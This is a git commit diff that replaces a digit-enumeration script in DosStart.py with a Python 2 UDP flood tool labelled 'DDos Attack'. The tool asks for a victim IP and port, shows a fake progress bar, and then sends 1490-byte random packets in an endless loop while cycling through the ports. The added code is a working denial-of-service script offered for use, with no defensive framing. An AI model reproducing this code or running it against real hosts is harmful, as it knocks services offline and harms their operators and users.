ffd034529eb8e2501a691f8cc04561c421bffb7c
! Lil x Sey <92247496+LilxxxSey@users.noreply.github.com>
2022-01-06 15:48:04 -0700

    Update DosStart.py

--- DosStart.py
+++ DosStart.py
@@ -1,20 +1,94 @@
-# Dos
-
 import sys
 
-num = '0123456789'
-file = open('phone.txt', 'a')
-code = input('[+] Introduzca la cantidad: ')
-    
-for a in num:
-    for b in num:
-        for c in num:
-            for d in num:
-                for e in num:
-                    for f in num:
-                        for g in num:
-                            for h in num:
-                                number = 'Packetes enviados:  ' +code+a+b+c+d+e+f+g+h
-                                file.write(number+'\n')
-                                print(number)
-file.close()                               
+import os
+
+import time
+
+import socket
+
+import random
+
+#Code Time
+
+from datetime import datetime
+
+now = datetime.now()
+
+hour = now.hour
+
+minute = now.minute
+
+day = now.day
+
+month = now.month
+
+year = now.year
+
+##############
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+bytes = random._urandom(1490)
+
+#############
+
+os.system("clear")
+
+os.system("figlet DDos Attack")
+
+print
+
+print "Author   : LilxSey"
+
+print "You Tube : https://youtube.com/channel/UCeNPM3cTcZ05MX22UNoz2Eg "
+
+print "github   : https://github.com/LilxxxSey"
+
+print " " 
+
+print
+
+ip = raw_input("IP Victima : ")
+
+port = input("Puerto       : ")
+
+os.system("clear")
+
+os.system("Iniciando El Ataque. ")
+
+print "[                    ] 0% "
+
+time.sleep(5)
+
+print "[=====               ] 25%"
+
+time.sleep(5)
+
+print "[==========          ] 50%"
+
+time.sleep(5)
+
+print "[===============     ] 75%"
+
+time.sleep(5)
+
+print "[====================] 100%"
+
+time.sleep(3)
+
+sent = 0
+
+while True:
+
+     sock.sendto(bytes, (ip,port))
+
+     sent = sent + 1
+
+     port = port + 1
+
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+
+     if port == 65534:
+
+       port = 1
+           
